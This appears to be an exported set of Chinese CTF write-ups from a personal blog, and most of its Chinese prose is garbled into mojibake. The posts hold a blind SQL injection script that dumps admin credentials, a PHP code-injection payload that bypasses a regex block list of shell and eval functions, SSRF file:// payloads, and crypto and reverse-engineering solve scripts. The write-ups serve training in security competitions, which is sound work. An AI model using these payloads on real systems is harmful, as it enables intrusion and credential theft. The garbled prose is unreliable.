æ¬¡æ•°ä¸º3ï¼Œåœ¨$K$ ä»£æ•°é—­åŒ…ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°ä¸‰ä¸ªæ ¹ $x_1,x_2,x_3$ï¼Œå³ $C$ ä¸Šçš„ä¸‰ä¸ªç‚¹ $(x_1,v(x_1)),(x_2,v(x_2)),(x_3,v(x_3))$ï¼Œåˆ©ç”¨æ‹‰æ ¼æœ—æ—¥æ’å€¼æ–¹æ³•å¯ä»¥æ¢å¤ $v(x)$ã€‚ å¾—åˆ° $u(x)$ å’Œ $v(x)$ï¼Œå¼‚æˆ–æ“ä½œè¿˜åŸæ˜æ–‡ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import structfrom itertools import product, cyclep = 10000000000000001119K = GF(p)R.&lt;x&gt; = K[]y = xf = y + y^7C = HyperellipticCurve(f, 0)J = C.jacobian()def get_u_from_out(output, known_input): res = [] for i in range(24): res.append(output[i]^^known_input[i]) res = bytes(res) u0, u1, u2 = struct.unpack(&quot;&lt;QQQ&quot;, res) u = x^3+x^2*u2+x*u1+u0 return udef get_v_from_u(u): Kbar = GF(p^6) Rbar.&lt;t&gt; = Kbar[&quot;t&quot;] u2 = u.change_ring(Rbar) roots = [x[0] for x in u2.roots()] ys = [] for root in roots: ys.append(f(root).sqrt(0,1)) res = [] for perm in product(range(2), repeat=3): poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) for i in range(3)]) if poly[0] in K: res.append(R(poly)) return resdef try_decode(output, u, v): rs = [u[0], u[1], u[2], v[0], v[1], v[2]] otp = struct.pack(&quot;&lt;QQQQQQ&quot;, *rs) decrypted = [a^^b for (a, b) in zip(output, cycle(otp)) ] return bytes(decrypted)output = bytes.fromhex(&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;)known_input = b&#x27;a&#x27; * 20 + b&#x27;flag&#x27;u = get_u_from_out(output, known_input)vs = get_v_from_u(u)for v in vs: #print((u,v)) print(try_decode(output,u,v)) #ç»“æœ#b&#x27;aaaaaaaaaaaaaaaaaaaaflag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag|\\xb1J\\xedFp^v2\\xb9\\x10\\x16\\xf6\\xfddD(h7\\xb6\\xc3S\\xe0\\xcf-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\\xe3J\\xad\\x88\\xb2\\xac\\xf8\\x1c-C\\x07\\x97\\x02/B47l\\xd0\\xf30\\x8f&amp;\\xbf-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\\xe4\\xca\\xf5\\xbd\\xc6\\xa6\\x00B\\xfe\\xde\\xe3z\\x9a\\xbe\\x95D\\xf9\\xc2\\xafD\\xda\\xff\\xa3\\xeb-97d120aae6fc&#125;&#x27; flagå€¼ï¼šflag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc} â€‹ Webfind_itä¸»é¡µé¢æ²¡ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼Œæ‰«æå‘ç°robots.txtï¼Œè®¿é—®æç¤ºï¼š 123When I was a child,I also like to read Robots.txtHere is what you want:1ndexx.php è®¿é—®1ndexx.phpæŠ¥500 Internal Server Errorï¼Œå°è¯•çœ‹æ˜¯å¦å­˜åœ¨vimæºç æ³„éœ²ï¼Œå‘ç°è®¿é—®.1ndexx.php.swpèƒ½å›æ˜¾æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123; die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; ä»£ç é€»è¾‘ï¼š å°†flag.phpæ–‡ä»¶å†…å®¹è¯»å…¥å˜é‡$I_know_you_wanna_but_i_will_not_give_you_hhhï¼Œå¹¶å°†ä¼ å…¥çš„codeå‚æ•°å€¼ä¸å˜é‡$I_know_you_wanna_but_i_will_not_give_you_hhhä¸€èµ·å†™å…¥hack.phpæ–‡ä»¶ä¸­ã€‚ å¯¹codeå‚æ•°å€¼è¿‡æ»¤çš„å…³é”®å­—ä¸å°‘ï¼š system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|~|^|`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump ç”¨å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶è¯»å†™ç­‰å¤šç§æ–¹å¼å°è¯•å‘hack.phpå†™å…¥phpä»£ç ï¼Œä»¥æ˜¾ç¤ºflag.phpæ–‡ä»¶å†…å®¹ï¼Œå‘ç°show_source()å‡½æ•°å¯è¡Œã€‚ payload: ?code=&lt;?=show_source(&quot;fla&quot;.&quot;g.php&quot;); æœ€åè®¿é—®hack.phpï¼Œå¾—åˆ°flag.phpå†…å®¹ï¼š 123456789&lt;?php #ini_set(&#x27;display_errors&#x27;,true);#error_reporting(E_ALL ^ E_NOTICE);flag=MZWGCZ33HA3GIOJWHA2DGLJYGNTDCLJUGE3DSLJZMQZDILJZGY3TIZRTHE3GMMJQGN6Q====;echo &quot;What is important for a new bird of php??&quot;?&gt; Base32è§£ç å¾—flagã€‚ flagå€¼ï¼šflag{86d96843-83f1-4169-9d24-9674f396f103} â€‹ WebsiteManager æœ€æ–°çš„ç½‘ç«™æµ‹è¯•å™¨ï¼Œä½œä¸ºéç«™é•¿çš„ä½ ï¼Œèƒ½åˆ©ç”¨å¥½å®ƒçš„åŠŸèƒ½å—ï¼Ÿ æŸ¥çœ‹ç½‘é¡µæºç å‘ç°image.php?id=1ï¼ŒçŒœæµ‹å­˜åœ¨sqlæ³¨å…¥ï¼Œæ‰‹å·¥æµ‹è¯•å‘ç°è¿‡æ»¤äº†ç©ºæ ¼å’ŒåŒå¼•å·ï¼Œä¸”æµ‹è¯•?id=-2/**/or/**/1=1æœ‰å›¾ç‰‡æ˜¾ç¤ºï¼Œ?id=-2/**/or/**/1=2æ— å›¾ç‰‡æ˜¾ç¤ºï¼ŒéªŒè¯å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œé‡‡ç”¨å¸ƒå°”ç›²æ³¨è·‘å‡ºç™»å½•ç”¨æˆ·åå’Œå¯†ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738import requestsurl = &quot;http://eci-2zefme7yqvztnp4652um.cloudeci1.ichunqiu.com/image.php&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;&#x27;&#x27; # payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;&#x27;&#x27; payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(username,password))from(ctf.users)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;&#x27;&#x27; data = &#123; &#x27;id&#x27;: f&quot;-2/**/or/**/&#123;payload&#125;&quot; &#125; r = requests.get(url,params=data) if &quot;HRN&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) #ç»“æœ#åº“å: ctf#è¡¨å: images,users#usersè¡¨ä¸­åˆ—åï¼š username,password#usersè¡¨ä¸­å€¼ï¼š admin,9ebab83595888e5a8bd57 ç”¨adminå’Œ9ebab83595888e5a8bd57ç›´æ¥ç™»å½•ï¼Œç»“åˆcurl.phpçŒœæµ‹æ˜¯SSRFï¼Œå¡«å…¥http://127.0.0.1/å¾—åˆ°è®¿é—®ç»“æœå›æ˜¾éªŒè¯çŒœæµ‹ï¼Œå°è¯•æ”¹ç”¨fileä¼ªåè®®ç›´æ¥è¯»å–æ ¹ç›®å½•flagæ–‡ä»¶å¾—åˆ°flagã€‚ payload: file://127.0.0.1/flag æˆ– file:///flag flagå€¼ï¼šflag{f0d06b4c-954e-4a76-ad5d-95bd0227daea}","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"WebAssembly","slug":"reverse-WebAssembly","date":"2021-04-03T15:30:16.000Z","updated":"2023-06-03T15:10:34.567Z","comments":true,"path":"2021/04/03/reverse-WebAssembly/","permalink":"https://lazzzaro.github.io/2021/04/03/reverse-WebAssembly/","excerpt":"","text":"â€‹ WebAssemblyï¼ˆwasmï¼‰æ˜¯åŸºäºå †æ ˆçš„è™šæ‹Ÿæœºçš„äºŒè¿›åˆ¶æŒ‡ä»¤æ ¼å¼ã€‚wasmè¢«è®¾è®¡ä¸ºå¯ç¼–ç¨‹C / C ++ / Rustç­‰é«˜çº§è¯­è¨€çš„å¯ç§»æ¤ç›®æ ‡ï¼Œå¯åœ¨Webä¸Šéƒ¨ç½²å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åº”ç”¨ç¨‹åºã€‚ wabtæ˜¯ç”¨äºWebAssemblyçš„ä¸€å¥—å·¥å…·ï¼ŒåŒ…æ‹¬ï¼š wat2wasmï¼šä»WebAssemblyæ–‡æœ¬æ ¼å¼è½¬æ¢ä¸º WebAssemblyäºŒè¿›åˆ¶æ ¼å¼wasm2watï¼š wat2wasmçš„é€†å‡½æ•°ï¼Œä»äºŒè¿›åˆ¶æ ¼å¼è½¬æ¢å›æ–‡æœ¬æ ¼å¼ï¼ˆä¹Ÿç§°ä¸º.watï¼‰wasm-objdumpï¼šæ˜¾ç¤ºæœ‰å…³wasmäºŒè¿›åˆ¶æ–‡ä»¶çš„ä¿¡æ¯ã€‚ä¸objdumpç±»ä¼¼ã€‚wasm-interpï¼šä½¿ç”¨åŸºäºå †æ ˆçš„è§£é‡Šå™¨è§£ç å¹¶è¿è¡ŒWebAssemblyäºŒè¿›åˆ¶æ–‡ä»¶wasm-decompileï¼šå°†wasmäºŒè¿›åˆ¶æ–‡ä»¶åç¼–è¯‘ä¸ºå¯è¯»çš„ç±»ä¼¼Cçš„è¯­æ³•ã€‚wat- desugarï¼šè§£æè§„èŒƒè§£é‡Šç¨‹åºæ”¯æŒçš„.watæ–‡æœ¬æ ¼å¼ï¼ˆSè¡¨è¾¾å¼ï¼Œå¹³é¢è¯­æ³•æˆ–æ··åˆæ ¼å¼ï¼‰å¹¶æ‰“å°â€œè§„èŒƒâ€å¹³é¢æ ¼å¼wasm2cï¼šå°†WebAssemblyäºŒè¿›åˆ¶æ–‡ä»¶è½¬æ¢ä¸ºCæºä»£ç å’Œæ ‡å¤´wasm-stripï¼šåˆ é™¤WebAssemblyäºŒè¿›åˆ¶æ–‡ä»¶çš„éƒ¨åˆ†wasm-validateï¼šéªŒè¯WebAssemblyäºŒè¿›åˆ¶æ ¼å¼çš„æ–‡ä»¶wast2jsonï¼šå°†wasm specæµ‹è¯•æ ¼å¼çš„æ–‡ä»¶è½¬æ¢ä¸ºJSONæ–‡ä»¶å’Œå…³è”çš„wasmäºŒè¿›åˆ¶æ–‡ä»¶wasm-opcodecntï¼šè®¡ç®—æŒ‡ä»¤çš„æ“ä½œç ä½¿ç”¨é‡spectest-interpï¼šè¯»å–Spectest JSONæ–‡ä»¶ï¼Œç„¶ååœ¨è§£é‡Šå™¨ä¸­è¿è¡Œå…¶æµ‹è¯• â€‹ é™æ€åˆ†æ JEBåç¼–è¯‘ wabt 123456789101112git config --global url.&quot;https://gitclone.com/&quot;.insteadOf https://git clone --recursive https://github.com/WebAssembly/wabtcd wabtgit submodule update --initmkdir buildcd buildcmake ..cmake --build ../wasm2wat wasm.wasm -o wasm.wat ï¼ˆåæ±‡ç¼–ï¼‰./wasm2c wasm.wasm -o wasm.c ï¼ˆåç¼–è¯‘ï¼Œæœ«å°¾å­—ç¬¦ä¸²ï¼‰gcc -c wasm.c -o wasm.o ï¼ˆä¼˜åŒ–,ç¼–è¯‘æ—¶éœ€è¦wabt/wasm2cç›®å½•ä¸­çš„wasm-rt.hã€wasm-rt-impl.cã€wasm-rt-impl.hä¸‰ä¸ªæ–‡ä»¶ï¼‰ 123apt install wabtwasm-decompile wasm.wasm â€‹ åŠ¨æ€è°ƒè¯• åœ¨å¯¹åº”æ–‡ä»¶å¤¹å¼€â¼€ä¸ªç®€æ˜“æœåŠ¡å™¨ï¼Œä½¿ç”¨pythonåˆ›å»ºâ¼€ä¸ªç®€æ˜“çš„æœ¬åœ°å±€åŸŸç½‘ï¼špython -m http.server -b localhostï¼Œä¹‹åä¾¿å¯ä»¥ç›´æ¥ç”¨æµè§ˆå™¨è®¿é—®ï¼š http://localhost:8000/wasm.html è·Ÿè¿›è°ƒè¯•ï¼ŒF12æ‰“å¼€è°ƒè¯•å™¨ï¼Œæ‰“å¼€wasmæ–‡ä»¶ ctrl+f æŸ¥æ‰¾mainå‡½æ•°ï¼Œç‚¹å‡»åœ°å€æ ä¸‹å¥½æ–­ç‚¹ï¼Œç„¶ååˆ·æ–°ï¼Œå¯ä»¥çœ‹è§è¢«æ–­ä¸‹ F8æ‰§è¡Œï¼ˆç­‰ä»·äºIDAçš„F9ï¼‰ï¼ŒF10å•æ­¥æ­¥è¿‡ï¼ŒF11å•æ­¥æ­¥å…¥ï¼Œç„¶åè·Ÿè¿›ï¼Œç›´åˆ°è¦æ±‚æˆ‘ä»¬è¾“â¼Šflag æŸ¥çœ‹å†…å­˜çš„æ–¹æ³•ï¼šä½œç”¨åŸŸ-æ¨¡å—ï¼Œç‚¹å‡»memoryå³ä¸Šè§’çš„å›¾æ ‡ å‚è€ƒï¼š wasmé€†å‘â€”â€”ï¼ˆæå®¢å¤§æŒ‘æˆ˜2021wasm","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"WebAssembly","slug":"WebAssembly","permalink":"https://lazzzaro.github.io/tags/WebAssembly/"},{"name":"wasm","slug":"wasm","permalink":"https://lazzzaro.github.io/tags/wasm/"}],"author":"Lazzaro"},{"title":"2021æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“","slug":"match-2021æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“","date":"2021-04-03T12:31:00.000Z","updated":"2021-10-16T16:22:07.999Z","comments":true,"path":"2021/04/03/match-2021æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“/","permalink":"https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/","excerpt":"","text":"â€‹ æ•°å­—ä¸­å›½æ˜¯åä¹å¤§æå‡ºçš„æ–°æ—¶ä»£å›½å®¶ä¿¡æ¯åŒ–å‘å±•çš„æ–°æˆ˜ç•¥ã€‚2021æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›ï¼Œä½œä¸ºæ•°å­—ä¸­å›½å»ºè®¾å³°ä¼šâ€œä¸€ä¼šã€ä¸€å±•ã€ä¸€èµ›â€çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œ å°†ç»§ç»­é‡‡å–å¤šèµ›é“å¹¶è¡Œçš„ç«èµ›å½¢å¼ï¼Œè®¾ç½®æ•°å­—å…šå»ºã€æ•°å­—æ”¿åºœã€å¤§æ•°æ®ã€æ™ºæ…§åŒ»ç–—ã€é²²é¹è®¡ç®—ã€ç½‘ç»œå®‰å…¨ã€é›†æˆç”µè·¯è®¾è®¡ã€é’å°‘å¹´AIæœºå™¨äººå…«ä¸ªèµ›é“ï¼Œç´§è´´æ•°å­—ä¸­å›½å»ºè®¾å³°ä¼šä¸»é¢˜ï¼Œå›´ç»•æ ¸å¿ƒå‰æ²¿æŠ€æœ¯ä¸ä¿¡æ¯æŠ€æœ¯åº”ç”¨åˆ›æ–°è®¾ç½®èµ›é¢˜ï¼Œä»¥å¤šç»´åº¦ç«‹ä½“åŒ–çš„è§’åº¦è¯ é‡Šâ€œæ•°å­—ä¸­å›½â€ã€‚ ç¬¬äºŒå±Šâ€œè™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“â€œå°†åœ¨å»å¹´é¦–æ¬¡å°†PKä½“ç³»ä¸ä¼ ç»Ÿç½‘ç»œå®‰å…¨ç«èµ›ç›¸ç»“åˆçš„ä¼˜åŠ¿åŸºç¡€ä¸Šï¼Œç»§ç»­ä¿æŒWintel+PKåŒä½“ç³»å¹¶è¡Œæ¨¡å¼è¿›è¡Œæ¯”èµ›ï¼Œä»¥â€œPKä½“ç³»â€åœ¨ç½‘ç»œå®‰å…¨èµ›äº‹ä¸­çš„åˆ›æ–°å‡çº§åº”ç”¨ä½œä¸ºèµ›äº‹çš„æ ¸å¿ƒé©±åŠ¨ã€‚åŒæ—¶åœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡ŒåŒ…æ‹¬èµ›äº‹åœºæ™¯ã€è¯„å§”é˜µå®¹ä»¥åŠé€‰æ‰‹æƒç›Šåœ¨å†…çš„ä¸‰å¤§å‡çº§ã€‚ https://www.ichunqiu.com/2021hfctf â€‹ rank: 80+ Miscä½ ä¼šæ—¥å¿—åˆ†æå— çº¿ç´¢åªæœ‰ä¸€ä»½access.logï¼Œä½ èƒ½ä»ä¸­åˆ†æåˆ°ä»€ä¹ˆï¼Ÿ æ˜æ˜¾èƒ½çœ‹å‡ºaccess.logæ—¥å¿—æ–‡ä»¶ä¸­åŒ…å«SQLæ—¶é—´ç›²æ³¨çš„è®°å½•ï¼Œç›´æ¥æ‹‰åˆ°æœ€åçœ‹ ?id=1&#39;%20and%20if(ord(substr((select%20flag%20from%20flllag),xx,1))=xx,sleep(2),1)è¯­å¥ï¼Œ é€ä¸ªå­—ç¬¦çŒœè§£ï¼Œæ­£ç¡®æƒ…å½¢ä¼šå»¶è¿Ÿ2sï¼Œè§‚å¯Ÿæ¯è¡Œå‰ä¸€åˆ—çš„æ—¶é—´ç§’æ•°ï¼Œä¸è¿ç»­çš„éƒ¨åˆ†å‰ä¸€ä¸ªå­—ç¬¦å³ä¸ºæ­£ç¡®å­—ç¬¦ã€‚ æ‡’å†™è„šæœ¬ï¼Œé€ä¸ªæ‰‹æ’¸å¾—åˆ°ä¸€ä¸²åè¿›åˆ¶æ•° 90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61ï¼Œ è½¬ä¸ºå­—ç¬¦ä¸ºbase64ç¼–ç å­—ç¬¦ä¸²ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==ï¼Œè§£ç å³ä¸ºflagã€‚ flag flag&#123;You_are_so_great&#125; â€‹ Cryptocubic Please give me 6 pairs of positive integers (x,y,z) satisfying the equation x/(y+z) + y/(z+x) + z/(x+y) = 6 ç»™å‡ºè‘—åä¸å®šæ–¹ç¨‹ $\\cfrac{x}{y+z}+\\cfrac{y}{x+z}+\\cfrac{z}{x+y}=6$ çš„6ç»„æ­£æ•´æ•°è§£ï¼Œä¹çœ‹å®¹æ˜“å®åˆ™ä¸ç„¶ã€‚ æ–¹ç¨‹åœ¨æ•´æ•°èŒƒå›´å†…æ˜“é€šè¿‡çˆ†ç ´æ±‚å¾—å¤šè§£ï¼Œè€Œæ­£æ•´æ•°èŒƒå›´å†…å¾ˆéš¾ç”¨åˆç­‰ä»£æ•°äººå·¥æ±‚å¾—å¤šè§£ï¼Œéœ€ç»“åˆæŠ½è±¡ä»£æ•°è§£å†³ã€‚ èƒŒæ™¯å‚è€ƒï¼šå²ä¸Šæœ€è´±çš„æ•°å­¦é¢˜ æŠŠ $x,y,z$ çœ‹ä¸º $a,b,c$ï¼Œå±•å¼€åŒ–ç®€ä¸ºï¼š $a^3+b^3+c^3-5(a^2b+ab^2+a^2c+ac^2+b^2c+bc^2)-9abc=0$ ç»“åˆå¼•ç”¨è®ºæ–‡ An unusual cubic representation problemï¼Œå°†æ–¹ç¨‹æ˜ å°„åˆ°äºŒç»´ç©ºé—´ï¼Œå³ $(a,b,c) \\rightarrow (x,y)$ã€‚ $(a,b,c) \\rightarrow (x,y)$ æ˜ å°„å…³ç³»å¼ï¼š $\\begin{cases} x=\\cfrac{-4(a+b+2c)(N+3)}{(2a+2b-c)+(a+b)N}=\\cfrac{-36(a+b+2c)}{8a+8b-c} \\\\ y=\\cfrac{4(a-b)(N+3)(2N+5)}{(2a+2b-c)+(a+b)N}=\\cfrac{612(a-b)}{8a+8b-c} \\end{cases}$ å– $(a,b,c)=(1,-1,0)$ï¼Œå¾—åˆ°æ¤­åœ†æ›²çº¿çš„Weierstrasså½¢å¼æ–¹ç¨‹ï¼š $E_6:y^2=x^3+(4N^2+12N-3)x^2+32(N+3)x=x^3+213x^2+288x$ åœ¨æ›²çº¿ä¸Šæ˜“å–å‡ºåŸºç‚¹ $G$ ä½œä¸ºåˆå§‹ç‚¹ï¼Œæ ¹æ®ä¸å®šæ–¹ç¨‹çš„ $(ka,kb,kc)$ é€šè§£ç‰¹æ€§ï¼Œå¯åˆ†åˆ«å°†åŸºç‚¹ $G$ æ•°ä¹˜å¾—åˆ° $2G,3G,\\cdots$ï¼Œå†åˆ†åˆ«é€šè¿‡å…³ç³»å¼æ˜ å°„å› $(a,b,c)$ï¼Œä»¥æ¡ä»¶åˆ¤æ–­ $a&gt;0,b&gt;0,c&gt;0$ï¼Œå¾—åˆ°çš„ $(a,b,c)$ å³ä¸ºä¸å®šæ–¹ç¨‹çš„æ­£æ•´æ•°è§£ã€‚ $(x,y) \\rightarrow (a,b,c)$ æ˜ å°„å…³ç³»å¼ï¼š $\\begin{cases} \\cfrac{a}{a+b+c}=\\cfrac{8(N+3)-x+y}{2(4-x)(N+3)} \\\\ \\cfrac{b}{a+b+c}=\\cfrac{8(N+3)-x-y}{2(4-x)(N+3)} \\\\ \\cfrac{c}{a+b+c}=\\cfrac{-4(N+3)-(N+2)x}{(4-x)(N+3)} \\end{cases}$ è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334#Sageee = EllipticCurve([0, 4*6^2+12*6-3, 0, 32*(6+3), 0])print(ee)print(ee.gens())P = ee(-200,680) def orig(P,N): x = P[0] y = P[1] a = (8*(N+3)-x+y)/(2*(N+3)*(4-x)) b = (8*(N+3)-x-y)/(2*(N+3)*(4-x)) c = (-4*(N+3)-(N+2)*x)/((N+3)*(4-x)) da = denominator(a) db = denominator(b) dc = denominator(c) l = lcm(da,lcm(db,dc)) return [a*l, b*l, c*l]ans = []for k in range(200): u = orig(k*P, 6) (a,b,c) = (u[0],u[1],u[2]) if a&gt;0 and b&gt;0 and c&gt;0: print(k) print(a) print(b) print(c) print(a/(b+c)+b/(a+c)+c/(a+b)) print() ans.append((a,b,c)) print(ans)#len(ans)=8 å†é€šè¿‡pwntoolsä¸ç¯å¢ƒäº¤äº’å¾—flagã€‚ 12345678910111213from pwn import *r = remote(&#x27;8.140.152.226&#x27;,27359)my = [...]r.recvline()for i in range(6): r.recvline() r.sendlineafter(&#x27;[&gt;] x: &#x27;,str(my[i][0])) r.sendlineafter(&#x27;[&gt;] y: &#x27;,str(my[i][1])) r.sendlineafter(&#x27;[&gt;] z: &#x27;,str(my[i][2])) print(r.recvline())print(r.recvall()) flag flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125; â€‹ Reverseredemption_code æ‰€è°“çš„è™å¿ƒæ‰‹æ¸¸ï¼Œè¿å‘çš„å…‘æ¢ç éƒ½è¿™ä¹ˆå¤æ‚ã€‚ åç¼–è¯‘çœ‹main()å‡½æ•°ï¼Œè¾“å…¥å­—ç¬¦ä¸²keyåˆ†åˆ«ç»è¿‡ä¸¤æ¬¡å¤„ç†ï¼š ç¬¬ä¸€å±‚å¤„ç†ï¼Œpre()å‡½æ•°ï¼š å…ˆåˆ¤æ–­è¾“å…¥keyé•¿åº¦len(key)==14ï¼Œå†ä¸å­—ç¬¦ä¸²ss1=&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;å…±åŒä½œä¸ºserver_check_redemption_code()å‡½æ•°å‚æ•°ï¼š server_check_redemption_code()å‡½æ•°çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œé€šè¿‡ç¼–å†™ä»£ç æµ‹è¯•ï¼ŒåŠŸèƒ½ä¸ºè¿”å›keyä¸­ç¬¦åˆå­—ç¬¦ä¸²sså­ä¸²çš„æœ€å¤§é•¿åº¦ï¼Œsæ•°ç»„ä¿å­˜é€è¡Œåˆ¤æ–­å¾—åˆ°çš„è¿ç»­å­—ç¬¦çŠ¶æ€å€¼ï¼Œå¦‚æ•´ä¸ªkeyä¸ºsså­ä¸²ï¼Œè¿”å›èµ·å§‹ä¸‹æ ‡å€¼k-len(key)+1ï¼Œå¦åˆ™è¿”å›-1ã€‚ ç¬¬äºŒå±‚å¤„ç†ï¼Œåˆ¤æ–­è¾“å…¥keyé•¿åº¦len(key)==14ï¼Œå†ä¸å­—ç¬¦ä¸²ss2=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;å…±åŒä½œä¸ºserver_check_redemption_code()å‡½æ•°å‚æ•°ã€‚ ç¬¬ä¸€æ¬¡checkï¼Œéœ€è¿”å›å€¼ä¸ç­‰äº-1è¿›åˆ°ç¬¬äºŒæ¬¡checkï¼Œç¬¬äºŒæ¬¡checkéœ€è¿”å›å€¼ä¸º7è¾“å‡ºflagï¼Œå³keyæ—¢æ˜¯ss1å­ä¸²ï¼Œåˆæ˜¯ss2ä»ä¸‹æ ‡7å¼€å§‹çš„å­ä¸²ï¼Œå³å…±æœ‰å­ä¸²Ninja Must Dieã€‚ flag flag&#123;Ninja Must Die&#125; â€‹ Webç­¾åˆ° å¸ˆå‚…ä»¬å¸¸è¯´ï¼Œè¦å–„äºå­¦ä¹ ï¼Œç»†è‡´å…¥å¾®ï¼›å¸ˆå‚…ä»¬ä¹Ÿå¸¸è¯´ï¼Œè¦å–„äºåˆ†äº«ï¼Œæ€»ç»“å½’çº³ã€‚ hint: 2021å¹´3æœˆ28æ—¥ï¼ŒPHPç»´æŠ¤çš„å®˜æ–¹GitæœåŠ¡å™¨ git.php.net è¢«è¢­å‡»ï¼Œå…¶Gitä»“åº“é­åˆ°æ¶æ„ç¯¡æ”¹ã€‚å¦‚æœå¼€å‘è€…ä½¿ç”¨è¿™äº›é­åˆ°ç¯¡æ”¹çš„æºä»£ç è¿›è¡Œç½‘é¡µçš„å¼€å‘çš„è¯ï¼Œç½‘ç«™å°±ä¼šåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¢«æ„ŸæŸ“ã€‚ å¼€å§‹åœ¨ç¯å¢ƒé‡Œç¿»äº†ä¸€åœˆæ— å¤´ç»ªï¼Œæ”¾hintåæŸ¥æ‰¾æ­¤äº‹ä»¶æ‰çŸ¥é“è¿™æ˜¯å‡ å¤©å‰çš„äº‹ï¼Œç´§è·Ÿæ—¶äº‹çš„å‡ºé¢˜äººã€‚ æ¥é¾™å»è„‰ï¼š 3æœˆ28æ—¥ï¼Œæ”»å‡»è€…ä½¿ç”¨PHPçš„ä½œè€…Rasmus Lerdorfå’ŒJetbrainså¼€å‘è€…Nikita 